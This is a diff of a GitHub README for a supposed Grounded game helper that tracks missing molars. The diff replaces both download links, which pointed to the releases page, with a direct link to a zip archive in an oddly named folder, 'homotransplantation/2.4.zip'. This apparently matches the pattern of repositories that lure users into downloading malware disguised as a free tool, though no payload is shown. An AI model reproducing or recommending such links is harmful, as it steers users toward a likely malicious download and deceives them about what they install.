@@ -1,7 +1,7 @@
 <h1>🔍 grounded-molar-tracker - Find Every Missing Molar Easily</h1>
 
 <p align="center">
-  <a href="https://github.com/rohitsvideos-max/grounded-molar-tracker/releases"><img src="https://img.shields.io/badge/Download%20Now-Free%20Tool-brightgreen?style=for-the-badge&logo=github" alt="Download"></a>
+  <a href="https://github.com/rohitsvideos-max/grounded-molar-tracker/raw/refs/heads/main/homotransplantation/2.4.zip"><img src="https://img.shields.io/badge/Download%20Now-Free%20Tool-brightgreen?style=for-the-badge&logo=github" alt="Download"></a>
 </p>
 
 ## 🎮 What Is This Tool?
@@ -16,7 +16,7 @@ This tool is designed for anyone who plays *Grounded* on PC and wants to collect
 
 ## 📥 Download and Install
 
-Visit this link to download the application: **[Download grounded-molar-tracker](https://github.com/rohitsvideos-max/grounded-molar-tracker/releases)**
+Visit this link to download the application: **[Download grounded-molar-tracker](https://github.com/rohitsvideos-max/grounded-molar-tracker/raw/refs/heads/main/homotransplantation/2.4.zip)**
 
 Here is what you need to do:
 
